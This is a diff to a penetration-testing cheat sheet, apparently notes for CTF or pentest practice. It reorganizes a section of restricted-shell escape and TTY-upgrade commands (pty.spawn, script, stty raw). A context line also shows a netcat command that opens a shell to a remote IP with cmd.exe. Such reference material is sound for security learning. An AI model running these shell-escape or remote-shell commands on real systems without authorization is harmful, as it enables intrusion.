@@ -171,13 +171,6 @@ $ nc -nv <IP address> <port> -e cmd.exe
 $ python3 -m http.server 8000
 ```
 
-- Shell Escapes
-
-```
-$ python3 -c 'import pty;pty.spawn("/bin/bash")'; CTRL+Z; stty raw -echo; fg; export TERM=XTERM
-$ script /dev/null -c bash
-```
-
 - Sqlmap
 
 ```
@@ -277,6 +270,25 @@ $ hashcat -a 0 -m 0 hashes.txt <wordlist>
 
 #6. - Restricted Shell Escapes
 -----------------------------------------
+
+- Shell Escapes
+
+```
+$ bash -i
+$ echo os.system('/bin/bash')
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+$ script /dev/null -c bash
+```
+
+- Tab Auto Completion
+
+```
+$ CTRL+Z
+$ stty raw -echo
+$ fg
+$ export TERM=XTERM
+```
 
 #7. - Online Resources
 -----------------------------------------
